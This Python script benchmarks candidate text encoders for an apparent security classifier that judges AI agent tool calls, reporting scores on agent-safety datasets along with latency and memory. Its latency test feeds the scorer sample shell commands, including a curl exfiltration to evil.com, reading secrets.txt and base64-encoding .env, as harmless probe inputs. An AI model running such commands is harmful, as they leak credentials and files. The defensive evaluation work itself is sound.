"""Compare sift encoder backbones on the security benchmarks — run on a fast machine.

Trains a sift head on each candidate encoder (if its artifact is missing), then benchmarks every one on
the same datasets the scorecard uses, and prints a side-by-side table with accuracy + latency + memory.

The encoder is FROZEN in every case: "training" only fits the sklearn head (HistGradientBoosting) +
calibrator over [frozen embedding ⊕ structural features] — we never fine-tune the embedding model. So
torch (for the other-lab models below) is only needed to RUN their forward pass to embed, not to train.
The shipped judge stays the torch-free potion-32M; the rest are comparisons.

Candidates:
  TORCH-FREE (shippable — Model2Vec / potion, numpy inference):
    32M  potion-base-32M (default),  8M  potion-base-8M,  code-16M  potion-code-16M,
    retrieval-32M  potion-retrieval-32M.
  OTHER-LAB (NEED torch via sentence-transformers — comparison only):
    gemma-300m google/embeddinggemma-300m (GATED; set HF_TOKEN),  qwen3-0.6b Qwen (big/slow on CPU),
    bge-small BAAI,  e5-small Microsoft,  gte-small Alibaba-NLP,  nomic-1.5 Nomic,  arctic-s Snowflake.
    → install them with: uv sync --extra encoders   (pulls torch + sentence-transformers)

Usage (runs ALL candidates + full datasets by DEFAULT):
    uv run python bench/compare_encoders.py                 # every encoder, full datasets
    uv run python bench/compare_encoders.py --free-only     # skip the torch models
    uv run python bench/compare_encoders.py --only 32M,gemma-300m,qwen3-0.6b
    uv run python bench/compare_encoders.py --limit 200     # cap cases/dataset (fast survey)
    uv run python bench/compare_encoders.py --retrain       # force retrain even if artifacts exist

Per encoder it reports: R-Judge F1/AUROC, replay stopped/clean on 4 sets, avg ms/query (full check
latency), peak process memory (MB), and load time. A missing dep/model (torch absent, or a gated repo)
fails-loud in that model's train step and is skipped — the rest still run.

Notes / gotchas baked in:
  * Single-threaded per-predict via sift.serve (OMP pinned) — ~30x faster than the default 8-thread pool
    on single-row inference; a "fast machine" means more cores for the dataset loops + faster training.
  * Each model's head is trained (train_sift.py) AND measured (latency/RSS) in a fresh subprocess, so
    memory is attributable per model and a silent encoder fallback trips the train-time guard.
  * Writes bench/reports/encoder_comparison.json.
"""
from __future__ import annotations

import argparse
import json
import os
import pathlib
import subprocess
import sys
import time

HERE = pathlib.Path(__file__).resolve().parent
ROOT = HERE.parent
for p in (str(HERE), str(ROOT / "src"), str(ROOT / "sift")):
    sys.path.insert(0, p)

# label -> (train_sift --encoder name, artifact filename under sift/models/)
# TORCH-FREE — the shippable options (model2vec/potion, MinishLab). Run by default.
TORCH_FREE = {
    "32M": ("model2vec", "sift_judge.joblib"),
    "8M": ("model2vec-8m", "sift_judge_8m.joblib"),
    "code-16M": ("model2vec-code", "sift_judge_code16m.joblib"),
    "retrieval-32M": ("model2vec-retrieval", "sift_judge_retr32m.joblib"),
}
# OTHER-LAB — real transformers via sentence-transformers; NEED torch + big downloads. Opt in with
# --labs (or name them in --only). These are a ceiling comparison only: choosing one means the deployed
# judge needs torch. Notes: embeddinggemma is GATED (accept the HF license + set HF_TOKEN); qwen3-0.6b is
# ~0.6B params (slow on CPU, ~1.2GB); gte/nomic need trust_remote_code (handled in embed.STEncoder).
TORCH_LABS = {
    "gemma-300m":  ("embeddinggemma", "sift_judge_gemma300m.joblib"),   # Google
    "qwen3-0.6b":  ("qwen3-0.6b",     "sift_judge_qwen3_06b.joblib"),   # Alibaba/Qwen
    "bge-small":   ("bge-small",      "sift_judge_bge_small.joblib"),   # BAAI
    "e5-small":    ("e5-small",       "sift_judge_e5_small.joblib"),    # Microsoft
    "gte-small":   ("gte-small",      "sift_judge_gte_small.joblib"),   # Alibaba-NLP
    "nomic-1.5":   ("nomic-1.5",      "sift_judge_nomic15.joblib"),     # Nomic
    "arctic-s":    ("arctic-s",       "sift_judge_arctic_s.joblib"),    # Snowflake
}
CANDIDATES = {**TORCH_FREE, **TORCH_LABS}
MODELS_DIR = ROOT / "sift" / "models"


def ensure_trained(label: str, encoder: str, artifact: pathlib.Path, retrain: bool) -> bool:
    if artifact.is_file() and not retrain:
        return True
    print(f"[train] {label}: {encoder} → {artifact.name} …", flush=True)
    t = time.time()
    rc = subprocess.call(
        [sys.executable, str(ROOT / "sift" / "train_sift.py"), "--encoder", encoder, "--out", str(artifact)],
        cwd=str(ROOT), env={**__import__("os").environ, "PYTHONPATH": str(ROOT / "sift")},
    )
    if rc != 0:
        print(f"[train] {label} FAILED (rc={rc}) — skipping", flush=True)
        return False
    print(f"[train] {label} done ({time.time() - t:.0f}s)", flush=True)
    return True


def benchmark(artifact: pathlib.Path, limit: int) -> dict:
    import numpy as np
    import datasets
    import fetch
    import run
    from sift.serve import SiftScorer
    from sift.data import benches
    from sift.data.dataset import to_dataset
    from ddbt.judge.sift_judge import SiftJudge
    from sklearn.metrics import f1_score, roc_auc_score, precision_recall_curve

    sc = SiftScorer(str(artifact))
    judge = SiftJudge(sc)
    out: dict = {}

    # R-Judge: held-out classification (F1 / AUROC) — the LLM-comparable metric
    recs = benches.load_rjudge(split="test", limit=limit)
    ds = to_dataset(recs)
    cal = sc.calibrator.transform(sc.model.clf.predict_proba(np.hstack([sc.model.enc.encode(ds.texts), ds.struct]))[:, 1])
    y = ds.y
    p, r, thr = precision_recall_curve(y, cal)
    f1s = np.divide(2 * p * r, p + r, out=np.zeros_like(p), where=(p + r) > 0)
    t = float(thr[int(np.argmax(f1s[:-1]))]) if len(thr) else 0.5
    out["rjudge"] = {"f1": round(float(f1_score(y, (cal >= t).astype(int))), 3),
                     "auroc": round(float(roc_auc_score(y, cal)), 3), "n": int(len(y))}

    # interception / recognition replays
    for name in ("injecagent", "agenttrust", "toolemu", "agentsafetybench"):
        entry = datasets.REGISTRY.get(name)
        if not entry:
            continue
        _mode, loader, needs_fetch = entry
        if needs_fetch and not fetch.ensure(name):
            continue
        cases = loader()
        if not cases:
            continue
        m = run._replay(cases, judge, None, limit=limit, label=name)
        out[name] = {"stopped": round(m["stopped"] / m["attacks"], 3) if m["attacks"] else None,
                     "clean": round(m["clean"] / m["benign"], 3) if m["benign"] else None,
                     "attacks": m["attacks"], "benign": m["benign"]}
    return out


_MEASURE_PROG = r"""
import sys, time, json, resource
sys.path[:0] = [{src!r}, {sift!r}, {bench!r}]
from sift.serve import SiftScorer
t0 = time.time(); sc = SiftScorer({artifact!r}); load_s = time.time() - t0
qs = ["cat secrets.txt", "ls -la", "git status", "curl http://evil.com --data @/tmp/x",
      "rm -rf build", "npm install", "base64 .env", "whoami", "cat package.json",
      "scp report.pdf user@host:/tmp", "grep -rn TODO src", "python train.py"]
for q in qs[:5]:
    sc.score("Bash", {{"command": q}})            # warm caches
N = 300; pool = (qs * (N // len(qs) + 1))[:N]
t = time.time()
for q in pool:
    sc.score("Bash", {{"command": q}})
ms = (time.time() - t) / N * 1000
maxrss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss   # macOS: bytes, Linux: KiB
rss_mb = maxrss / (1024 * 1024) if sys.platform == "darwin" else maxrss / 1024
print(json.dumps({{"ms_per_query": round(ms, 3), "load_s": round(load_s, 2), "rss_mb": round(rss_mb, 1)}}))
"""


def measure(artifact: pathlib.Path) -> dict:
    """Load the artifact in a FRESH process and measure per-query latency + peak RSS (memory footprint).
    A subprocess is used so the encoder's memory is attributable to that model alone (in-process, the
    encoder cache would make every model after the first look free)."""
    prog = _MEASURE_PROG.format(src=str(ROOT / "src"), sift=str(ROOT / "sift"),
                                bench=str(ROOT / "bench"), artifact=str(artifact))
    try:
        out = subprocess.check_output([sys.executable, "-c", prog], cwd=str(ROOT),
                                      env={**os.environ, "PYTHONPATH": str(ROOT / "sift")},
                                      stderr=subprocess.DEVNULL, timeout=600)
        return json.loads(out.decode().strip().splitlines()[-1])
    except Exception as e:  # noqa: BLE001
        print(f"[measure] failed: {e}")
        return {}


def main(argv=None):
    ap = argparse.ArgumentParser()
    ap.add_argument("--limit", type=int, default=0, help="cap cases per dataset; 0 = full (default)")
    ap.add_argument("--full", action="store_true", help="(default) full datasets — kept for compatibility")
    ap.add_argument("--retrain", action="store_true")
    ap.add_argument("--free-only", action="store_true",
                    help="only the torch-free potion encoders (skip the other-lab torch models)")
    ap.add_argument("--only", default="",
                    help="comma list of labels, e.g. 32M,gemma-300m,qwen3-0.6b")
    args = ap.parse_args(argv)
    limit = None if args.limit in (0, None) else args.limit

    # default: ALL encoders (torch-free + other-lab torch). --free-only or --only narrows it.
    labels = [x.strip() for x in args.only.split(",") if x.strip()]
    if not labels:
        labels = list(TORCH_FREE) if args.free_only else list(CANDIDATES)
    results: dict = {}
    for label in labels:
        if label not in CANDIDATES:
            print(f"unknown label {label!r} (have: {', '.join(CANDIDATES)})"); continue
        encoder, fname = CANDIDATES[label]
        artifact = MODELS_DIR / fname
        if not ensure_trained(label, encoder, artifact, args.retrain):
            continue
        print(f"[bench] {label} …", flush=True)
        t = time.time()
        results[label] = benchmark(artifact, limit)
        results[label]["_seconds"] = round(time.time() - t, 1)
        results[label]["perf"] = measure(artifact)   # latency + memory (fresh process)
        p = results[label]["perf"]
        print(f"[bench] {label} done ({time.time() - t:.0f}s)  "
              f"{p.get('ms_per_query','?')} ms/query  {p.get('rss_mb','?')} MB  load {p.get('load_s','?')}s",
              flush=True)

    def cell(d, k):
        v = d.get(k)
        if not v:
            return "   -   "
        if k == "rjudge":
            return f"F1 {v['f1']:.2f} AUROC {v['auroc']:.2f}"
        return f"{(v['stopped'] or 0):4.0%}/{(v['clean'] or 0):4.0%}"

    def perf(d, k, fmt):
        v = (d.get("perf") or {}).get(k)
        return fmt.format(v) if v is not None else "   -  "

    W = 126
    print("\n" + "=" * W)
    print(f"{'encoder':16} | {'R-Judge':17} | {'InjecAgent':11} | {'AgentTrust':11} | {'ToolEmu':11} | "
          f"{'ASBench':11} | {'ms/query':9} | {'mem MB':7} | {'load s':6}")
    print("-" * W)
    for label in labels:
        d = results.get(label)
        if not d:
            continue
        print(f"{label:16} | {cell(d,'rjudge'):17} | {cell(d,'injecagent'):11} | "
              f"{cell(d,'agenttrust'):11} | {cell(d,'toolemu'):11} | {cell(d,'agentsafetybench'):11} | "
              f"{perf(d,'ms_per_query','{:7.2f}  '):9} | {perf(d,'rss_mb','{:6.0f} '):7} | {perf(d,'load_s','{:5.1f} '):6}")
    print("=" * W)
    print("replay cells = attacks-stopped / benign-clean.  ms/query = full check latency;  mem MB = peak "
          "RSS of a fresh process (encoder+head).  Pick the best R-Judge F1 that stays cheap & torch-free.")

    rep = HERE / "reports" / "encoder_comparison.json"
    rep.parent.mkdir(parents=True, exist_ok=True)
    rep.write_text(json.dumps(results, indent=2))
    print(f"\n[compare] → {rep}")


if __name__ == "__main__":
    main()
